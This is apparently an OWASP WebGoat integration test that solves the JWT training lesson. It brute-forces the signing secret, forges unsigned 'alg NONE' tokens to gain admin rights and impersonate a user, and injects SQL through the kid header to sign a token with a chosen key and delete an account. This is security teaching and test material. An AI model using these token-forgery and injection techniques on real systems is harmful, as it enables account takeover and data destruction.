package org.owasp.webgoat;

import java.io.IOException;
import java.nio.charset.Charset;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.time.Instant;
import java.util.Base64;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import org.hamcrest.CoreMatchers;
import org.junit.Assert;
import org.junit.jupiter.api.Test;
import org.owasp.webgoat.jwt.JWTSecretKeyEndpoint;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;

import io.jsonwebtoken.Header;
import io.jsonwebtoken.JwsHeader;
import io.jsonwebtoken.Jwt;
import io.jsonwebtoken.JwtException;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.impl.TextCodec;
import io.restassured.RestAssured;

public class JWTLessonTest extends IntegrationTest {
	
    @Test
    public void solveAssignment() throws IOException, InvalidKeyException, NoSuchAlgorithmException {

    	startLesson("JWT");
  
        resetVotes();
                
        findPassword();
        
        buyAsTom();
        
        deleteTom();
        
        checkResults("/JWT/");

    }
    
    private String generateToken(String key) {
    	
    	return Jwts.builder()
		.setIssuer("WebGoat Token Builder")
		.setAudience("webgoat.org")
		.setIssuedAt(Calendar.getInstance().getTime())
		.setExpiration(Date.from(Instant.now().plusSeconds(60)))
		.setSubject("tom@webgoat.org")
		.claim("username", "WebGoat")
		.claim("Email", "tom@webgoat.org")
		.claim("Role", new String[] {"Manager", "Project Administrator"})
		.signWith(SignatureAlgorithm.HS256, key).compact();
    }
    
    private String getSecretToken(String token) {
    	for (String key : JWTSecretKeyEndpoint.SECRETS) {
    		try {
    			Jwt jwt = Jwts.parser().setSigningKey(TextCodec.BASE64.encode(key)).parse(token);
    		} catch (JwtException e) {
    			continue;
    		}
    		return TextCodec.BASE64.encode(key);
    	}
    	return null;
    }
    
    private void findPassword() throws IOException, NoSuchAlgorithmException, InvalidKeyException {
    	
    	String accessToken = RestAssured.given()
                .when()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", getWebGoatCookie())
                .get(url("/WebGoat/JWT/secret/gettoken"))
                .then()
                .extract().response().asString();
    	
    	String secret = getSecretToken(accessToken);
    	
        Assert.assertThat(
                RestAssured.given()
                        .when()
                        .relaxedHTTPSValidation()
                        .cookie("JSESSIONID", getWebGoatCookie())
                        .formParam("token", generateToken(secret))
                        .post(url("/WebGoat/JWT/secret"))
                        .then()
                        .statusCode(200)
                        .extract().path("lessonCompleted"), CoreMatchers.is(true));
    	
    }
    
    private void resetVotes() throws IOException {
    	String accessToken = RestAssured.given()
                .when()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", getWebGoatCookie())
                .get(url("/WebGoat/JWT/votings/login?user=Tom"))
                .then()
                .extract().cookie("access_token");

        String header = accessToken.substring(0, accessToken.indexOf("."));
        header = new String(Base64.getUrlDecoder().decode(header.getBytes(Charset.defaultCharset())));
        
        String body = accessToken.substring(1+accessToken.indexOf("."), accessToken.lastIndexOf("."));
        body = new String(Base64.getUrlDecoder().decode(body.getBytes(Charset.defaultCharset())));

        ObjectMapper mapper = new ObjectMapper();
        JsonNode headerNode = mapper.readTree(header);
        headerNode = ((ObjectNode) headerNode).put("alg","NONE");

        JsonNode bodyObject = mapper.readTree(body);
        bodyObject = ((ObjectNode) bodyObject).put("admin","true");
        
        String replacedToken = new String(Base64.getUrlEncoder().encode(headerNode.toString().getBytes()))
        		.concat(".")
        		.concat(new String(Base64.getUrlEncoder().encode(bodyObject.toString().getBytes())).toString())
        		.concat(".").replace("=", "");
        
        Assert.assertThat(
                RestAssured.given()
                        .when()
                        .relaxedHTTPSValidation()
                        .cookie("JSESSIONID", getWebGoatCookie())
                        .cookie("access_token", replacedToken)
                        .post(url("/WebGoat/JWT/votings"))
                        .then()
                        .statusCode(200)
                        .extract().path("lessonCompleted"), CoreMatchers.is(true));
    }
    
	private void buyAsTom() throws IOException {
		
		String header = new String(Base64.getUrlDecoder().decode("eyJhbGciOiJIUzUxMiJ9".getBytes(Charset.defaultCharset())));

		String body = new String(Base64.getUrlDecoder().decode("eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0".getBytes(Charset.defaultCharset())));

		body = body.replace("Jerry", "Tom");
		
		ObjectMapper mapper = new ObjectMapper();
		JsonNode headerNode = mapper.readTree(header);
		headerNode = ((ObjectNode) headerNode).put("alg", "NONE");

		String replacedToken = new String(Base64.getUrlEncoder().encode(headerNode.toString().getBytes())).concat(".")
				.concat(new String(Base64.getUrlEncoder().encode(body.getBytes())).toString())
				.concat(".").replace("=", "");

		Assert.assertThat(RestAssured.given()
				.when().relaxedHTTPSValidation()
				.cookie("JSESSIONID", getWebGoatCookie())
				.header("Authorization","Bearer "+replacedToken)
				.post(url("/WebGoat/JWT/refresh/checkout"))
				.then().statusCode(200)
				.extract().path("lessonCompleted"), CoreMatchers.is(true));
	}
	
	private void deleteTom() {
		
		Map<String, Object> header = new HashMap();
		  header.put(Header.TYPE, Header.JWT_TYPE);
		  header.put(JwsHeader.KEY_ID, "hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS --");
		String token = Jwts.builder()
				.setHeader(header)
				.setIssuer("WebGoat Token Builder")
				.setAudience("webgoat.org")
				.setIssuedAt(Calendar.getInstance().getTime())
				.setExpiration(Date.from(Instant.now().plusSeconds(60)))
				.setSubject("tom@webgoat.org")
				.claim("username", "Tom")
				.claim("Email", "tom@webgoat.org")
				.claim("Role", new String[] {"Manager", "Project Administrator"})
				.signWith(SignatureAlgorithm.HS256, "deletingTom").compact();
		
		Assert.assertThat(RestAssured.given()
				.when().relaxedHTTPSValidation()
				.cookie("JSESSIONID", getWebGoatCookie())
				.post(url("/WebGoat/JWT/final/delete?token="+token))
				.then()
				.statusCode(200)
				.extract().path("lessonCompleted"), CoreMatchers.is(true));
	}
    
}
